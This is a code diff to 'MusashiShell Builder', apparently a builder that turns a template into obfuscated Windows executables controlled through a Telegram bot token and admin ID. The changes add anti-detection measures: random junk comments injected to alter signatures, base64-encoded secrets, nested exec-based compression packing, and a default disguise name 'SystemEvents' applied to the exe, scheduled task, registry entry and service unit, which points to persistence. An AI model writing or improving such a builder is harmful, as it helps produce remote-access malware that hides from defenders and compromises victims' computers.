@@ -2,6 +2,7 @@ import sys, os
 
 if os.name == "nt":
     os.system("")
+    os.system("title MusashiShell Builder")
     try:
         import ctypes
         k32 = ctypes.windll.kernel32
@@ -31,7 +32,7 @@ for _s in (sys.stdout, sys.stderr, sys.stdin):
 os.environ.setdefault("PYTHONIOENCODING", "utf-8")
 os.environ.setdefault("PYTHONUTF8", "1")
 
-import re, shutil, subprocess, time, json, logging
+import re, shutil, subprocess, time, json, logging, random, string
 import base64, gzip, lzma, zlib
 from pathlib import Path
 from logging.handlers import RotatingFileHandler
@@ -56,6 +57,7 @@ CONF       = Path("cfg/builder.conf")
 ICON       = Path("resources/app.ico")
 LOG_DIR    = Path("logs")
 LOG_FILE   = LOG_DIR / "builder.log"
+DEFAULT_APP_NAME = "SystemEvents"
 
 console = Console(legacy_windows=False)
 
@@ -112,6 +114,22 @@ def term_width() -> int:
         return 120
 
 
+def _random_junk_comments(n: int = 3, min_len: int = 10, max_len: int = 24) -> str:
+    alphabet = string.ascii_letters + string.digits
+    lines = []
+    for _ in range(n):
+        length = random.randint(min_len, max_len)
+        lines.append("# " + "".join(random.choice(alphabet) for _ in range(length)))
+    return "\n".join(lines) + "\n"
+
+
+def _inject_junk(src: str, junk: str) -> str:
+    marker = "# -*- coding: utf-8 -*-\n"
+    if marker in src:
+        return src.replace(marker, marker + junk, 1)
+    return junk + src
+
+
 def matryoshka_pack(src_code: str) -> str:
     log.debug("matryoshka_pack: input %d bytes", len(src_code))
     packed = base64.b64encode(
@@ -122,15 +140,6 @@ def matryoshka_pack(src_code: str) -> str:
         )
     )[::-1].decode()
 
-    bootstrap = (
-        "import asyncio,subprocess,logging,platform,socket,os,getpass,uuid,urllib.request\n"
-        "import aiohttp\n"
-        "from aiogram import Bot,Dispatcher,F\n"
-        "from aiogram.filters import Command\n"
-        "from aiogram.types import Message\n"
-        "from aiogram.client.session.aiohttp import AiohttpSession\n"
-    )
-
     body = (
         "_=lambda __:exec(__import__('gzip').decompress("
         "__import__('lzma').decompress("
@@ -139,10 +148,9 @@ def matryoshka_pack(src_code: str) -> str:
         f"_('{packed}')"
     )
 
-    result = bootstrap + body
     log.debug("matryoshka_pack: output %d bytes (packed body %d bytes)",
-              len(result), len(packed))
-    return result
+              len(body), len(packed))
+    return body
 
 
 def banner():
@@ -152,7 +160,7 @@ def banner():
     else:
         art = "=== MusashiShell ===\n"
     console.print(Align.center(Text(art, style="bold cyan")))
-    console.print(Align.center(Text("Binary builder  |  v1.5", style="dim white")))
+    console.print(Align.center(Text("Binary builder  |  MusashiShell", style="dim white")))
     console.print()
     log.debug("banner drawn, term_width=%d", term_width())
 
@@ -185,6 +193,10 @@ def valid_name(s: str) -> bool:
     return bool(re.fullmatch(r"[A-Za-zА-Яа-я0-9 _\-]{1,40}", s))
 
 
+def valid_app_name(s: str) -> bool:
+    return bool(re.fullmatch(r"[A-Za-z0-9_\-]{1,40}", s))
+
+
 def slugify(name: str) -> str:
     s = name.strip().replace(" ", "_")
     s = re.sub(r"[^A-Za-z0-9_\-]", "", s)
@@ -204,14 +216,20 @@ def load_conf() -> dict:
     return {}
 
 
-def save_conf(token: str, admin_id: str, name: str):
+def save_conf(token: str, admin_id: str, name: str, app_name: str):
     CONF.parent.mkdir(parents=True, exist_ok=True)
     CONF.write_text(
-        json.dumps({"token": token, "admin_id": admin_id, "name": name}, indent=2),
+        json.dumps({
+            "token": token,
+            "admin_id": admin_id,
+            "name": name,
+            "app_name": app_name,
+        }, indent=2),
         encoding="utf-8",
     )
-    log.info("config saved: admin_id=%s name=%r token=%s...%s",
-             admin_id, name, token[:8] if len(token) > 8 else "***",
+    log.info("config saved: admin_id=%s name=%r app_name=%r token=%s...%s",
+             admin_id, name, app_name,
+             token[:8] if len(token) > 8 else "***",
              token[-4:] if len(token) > 4 else "***")
 
 
@@ -243,6 +261,19 @@ def ask_name() -> str:
             return v
         log.warning("invalid client name rejected: %r", v)
         console.print("[red][WARN] letters/digits/space/_/- only, up to 40 chars[/]")
+
+
+def ask_app_name(default: str = DEFAULT_APP_NAME) -> str:
+    while True:
+        v = Prompt.ask(
+            "[cyan]App name[/] [dim](exe / task / registry / unit)[/]",
+            default=default,
+        ).strip()
+        if valid_app_name(v):
+            log.debug("app name accepted: %r", v)
+            return v
+        log.warning("invalid app name rejected: %r", v)
+        console.print("[red][WARN] letters/digits/_/- only, up to 40 chars[/]")
 
 
 def _src_signature(path: Path) -> tuple:
@@ -294,8 +325,8 @@ def paths_for(name: str):
     return result
 
 
-def build_py(token: str, admin_id: str, name: str):
-    log.info("build_py start: name=%r", name)
+def build_py(token: str, admin_id: str, name: str, app_name: str = DEFAULT_APP_NAME):
+    log.info("build_py start: name=%r app_name=%r", name, app_name)
 
     if not TEMPLATE.exists():
         log.error("template missing: %s", TEMPLATE)
@@ -311,16 +342,26 @@ def build_py(token: str, admin_id: str, name: str):
 
     log.debug("template loaded: %d bytes", len(src))
 
-    for ph in ("__TOKEN__", "__ADMIN_ID__", "__NAME__"):
+    for ph in ("__TOKEN__", "__ADMIN_ID__", "__NAME__", "__APP_NAME__"):
         if ph not in src:
             log.error("template has no placeholder: %s", ph)
             console.print(f"[red][ERR] template.py has no placeholder {ph}[/]")
             sys.exit(1)
 
+    token_b64 = base64.b64encode(token.encode("utf-8")).decode("ascii")
+    aid_b64 = base64.b64encode(admin_id.encode("utf-8")).decode("ascii")
+    log.debug("secrets base64-encoded (token_b64=%dB, aid_b64=%dB)",
+              len(token_b64), len(aid_b64))
+
     client_src = (src
-                  .replace("__TOKEN__", token)
-                  .replace("__ADMIN_ID__", admin_id)
-                  .replace("__NAME__", name))
+                  .replace("__TOKEN__", token_b64)
+                  .replace("__ADMIN_ID__", aid_b64)
+                  .replace("__NAME__", name)
+                  .replace("__APP_NAME__", app_name))
+
+    junk = _random_junk_comments(3)
+    client_src = _inject_junk(client_src, junk)
+    log.debug("injected junk comments:\n%s", junk)
 
     obf_src = matryoshka_pack(client_src)
 
@@ -358,6 +399,7 @@ def build_py(token: str, admin_id: str, name: str):
 
     console.print(f"[green][OK][/]  Clean:      [bold]{p['py']}[/]")
     console.print(f"[green][OK][/]  Obfuscated: [bold]{p['obf']}[/]")
+    console.print(f"[green][OK][/]  App name:   [bold cyan]{app_name}[/]")
     log.info("build_py done: %s, %s", p["py"], p["obf"])
     return p["py"], p["obf"]
 
@@ -422,9 +464,19 @@ def build_exe(name: str, obf: bool = True, force: bool = False):
         cmd += ["--exclude-module", mod]
 
     if obf:
-        for mod in ("asyncio", "subprocess", "logging", "platform", "socket",
-                    "getpass", "uuid", "urllib.request", "urllib.error"):
+        HIDDEN = [
+            "asyncio", "atexit", "base64", "getpass", "gzip", "json",
+            "logging", "lzma", "os", "pathlib", "platform", "random",
+            "shutil", "signal", "socket", "string", "subprocess", "sys",
+            "time", "urllib.request", "urllib.error", "uuid", "zlib",
+            "ctypes",
+        ]
+        if os.name == "nt":
+            HIDDEN.append("winreg")
+
+        for mod in HIDDEN:
             cmd += ["--hidden-import", mod]
+
         cmd += ["--collect-submodules", "aiogram"]
         cmd += ["--collect-submodules", "aiohttp"]
 
@@ -535,8 +587,10 @@ def show_conf():
     table.add_row("Token", masked)
     table.add_row("Admin ID", str(c.get("admin_id", "-")))
     table.add_row("Client name", str(c.get("name", "-")))
+    table.add_row("App name", str(c.get("app_name", DEFAULT_APP_NAME)))
     console.print(Panel(table, title="Current settings", border_style="cyan"))
-    log.debug("show_conf: admin_id=%s name=%r", c.get("admin_id"), c.get("name"))
+    log.debug("show_conf: admin_id=%s name=%r app_name=%r",
+              c.get("admin_id"), c.get("name"), c.get("app_name"))
 
 
 def list_clients():
@@ -618,10 +672,21 @@ def flow_configure_and_build():
     if not name or not valid_name(name):
         name = ask_name()
 
-    save_conf(token, aid, name)
-    console.print("[green][OK] Config saved, starting build...[/]\n")
+    app_default = c.get("app_name", DEFAULT_APP_NAME)
+    app_name = Prompt.ask(
+        "[cyan]App name[/] [dim](exe / task / registry / unit)[/]",
+        default=app_default,
+    ).strip()
+    if not app_name or not valid_app_name(app_name):
+        app_name = ask_app_name(app_default)
 
-    build_py(token, aid, name)
+    save_conf(token, aid, name, app_name)
+    console.print(
+        f"[green][OK] Config saved[/] "
+        f"[dim](app name: {app_name})[/], starting build...\n"
+    )
+
+    build_py(token, aid, name, app_name)
 
     console.print()
     build_exe(name, obf=True)
@@ -635,7 +700,12 @@ def flow_regenerate_py():
         log.warning("regenerate_py: no config")
         console.print("[red]Set config first (option 1)[/]")
         return
-    build_py(c["token"], c["admin_id"], c.get("name", "BOT Client"))
+    build_py(
+        c["token"],
+        c["admin_id"],
+        c.get("name", "BOT Client"),
+        c.get("app_name", DEFAULT_APP_NAME),
+    )
     log.info("flow_regenerate_py done")
 
 
@@ -653,7 +723,12 @@ def flow_rebuild_exe():
     if not p["obf"].exists():
         log.warning("client_obf.py missing, regenerating")
         console.print("[yellow]client_obf.py not found, generating...[/]")
-        build_py(c["token"], c["admin_id"], name)
+        build_py(
+            c["token"],
+            c["admin_id"],
+            name,
+            c.get("app_name", DEFAULT_APP_NAME),
+        )
 
     build_exe(name, obf=True)
     log.info("flow_rebuild_exe done")
